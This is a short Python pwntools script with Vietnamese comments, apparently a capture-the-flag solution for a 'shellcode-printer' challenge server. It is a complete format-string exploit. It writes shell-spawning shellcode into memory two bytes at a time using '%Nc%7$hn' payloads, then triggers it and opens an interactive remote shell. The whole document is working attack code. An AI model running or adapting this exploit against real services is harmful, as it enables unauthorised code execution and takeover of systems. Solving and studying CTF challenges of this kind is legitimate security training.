#!/usr/bin/env python3
from pwn import *

# === CẤU HÌNH CUỐI CÙNG ===
REMOTE_SERVER = 'shellcode-printer.nc.jctf.pro'
REMOTE_PORT = 1337

# OFFSET CHÍNH XÁC TÌM ĐƯỢC TỪ PHÂN TÍCH ASSEMBLY
STACK_OFFSET = 7

context.arch = 'amd64'
context.log_level = 'info'

try:
    p = remote(REMOTE_SERVER, REMOTE_PORT)
    shellcode = asm(shellcraft.sh())
    
    log.info(f"Bắt đầu khai thác với STACK_OFFSET chính xác là: {STACK_OFFSET}")

    # Vòng lặp để ghi từng 2 byte (short) của shellcode
    for i in range(0, len(shellcode), 2):
        # Lấy 2 byte từ shellcode để ghi
        value_to_write = u16(shellcode[i:i+2].ljust(2, b'\x90'))

        # Xử lý trường hợp cần ghi giá trị 0
        if value_to_write == 0:
            # Ghi giá trị 0 bằng cách không in thêm ký tự nào.
            # %c không hoạt động với 0. Chúng ta sẽ dùng %hn trực tiếp
            # nhưng nó sẽ ghi số lượng ký tự đã in, có thể không phải là 0.
            # Cách tốt nhất là ghi một số lớn có 2 byte cuối là 0, như 0x10000.
            payload = f'%{0x10000}c%{STACK_OFFSET}$hn'.encode()
        else:
            payload = f'%{value_to_write}c%{STACK_OFFSET}$hn'.encode()

        # Kiểm tra lại payload để đảm bảo nó dưới 15 byte.
        # Ví dụ: "%65535c%7$hn" có độ dài là 1 + 5 + 1 + 1 + 1 + 3 = 12 bytes. AN TOÀN.
        if len(payload) > 15:
            log.error(f"Lỗi nghiêm trọng: Payload quá dài ({len(payload)} bytes). Dừng lại.")
            exit()
            
        log.info(f"Đang ghi 2 byte: {hex(value_to_write)}")
        p.sendlineafter(b'Enter a format string: ', payload)

    # Kích hoạt shellcode bằng cách gửi một dòng trống
    log.success("Ghi shellcode thành công! Kích hoạt shell...")
    p.sendlineafter(b'Enter a format string: ', b'')

    # Tận hưởng shell
    p.interactive()

except Exception as e:
    log.error(f"Đã xảy ra lỗi trong quá trình khai thác: {e}")